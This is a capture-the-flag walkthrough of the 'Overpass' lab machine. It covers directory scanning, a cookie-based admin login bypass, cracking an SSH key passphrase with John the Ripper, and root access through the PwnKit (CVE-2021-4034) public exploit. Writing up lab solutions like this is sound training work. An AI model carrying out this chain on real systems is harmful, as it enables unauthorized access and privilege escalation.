# Overpass

Ip address: 
```bash
ip = 10.10.47.241
```


## Scanning the webserver

Scanning the webserver with the tool "feroxbuster"
`feroxbuster --url http://10.10.47.241/`

Results:

An admin page is found

## /admin/

Login is required. Jsoncode says:
```javascript
If (result == "unauth or something")
{

}
else{
	setCookie("sessionToken", anyvalue);
}
```

SO: By setting this cookie we can log in.

## /admin/ (logged in)

This shows an RSA private key

-> Decrypt the password with John the Ripper

1. use JohnTheRipper (ssh2john) -> with `wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py`
```bash
python ssh2john.py id_rsa > id_rsa.hash
```
2. Use JohnTheRipper again but to crack the hash

use the wordlist from `/usr/share/wordlists/rockyou.txt`

The full command is: `john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash`

My password is: `james13`

## SSH into the server

ssh into the server using the command 
```bash
ssh james@10.10.47.241 -i id_rsa
```
cat the users.txt file

## Privilege escalation

Then, to check privesc, upload linpeas from the attacking host to the target: 

```bash
scp -i id_rsa linpeas.sh james@10.10.172.85:/home/james/
```

On the target, run linpeas. There it says it is vurnerable to `
CVE-2021-4034`.

### CVA-2021-4034

This is a privesc vurnerability. The description is as follows:

```
A local privilege escalation vulnerability was found on polkit's pkexec utility. The pkexec application is a setuid tool designed to allow unprivileged users to run commands as privileged users according predefined policies. The current version of pkexec doesn't handle the calling parameters count correctly and ends trying to execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it'll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation given unprivileged users administrative rights on the target machine.
```

To use this CVE, we can use the github project https://github.com/berdav/CVE-2021-4034

1. Clone the repo on the attacker host

```bash
git clone https://github.com/berdav/CVE-2021-4034.git
```

2. Copy the repo to the target

```bash
scp -i id_rsa -r CVE-2021-4034 james@10.10.172.85:/home/james
```

3. compile the repo by running the `make` command

4. run `./cve-2021-4034`

5. Read the `root.txt` flag in the `/root` folder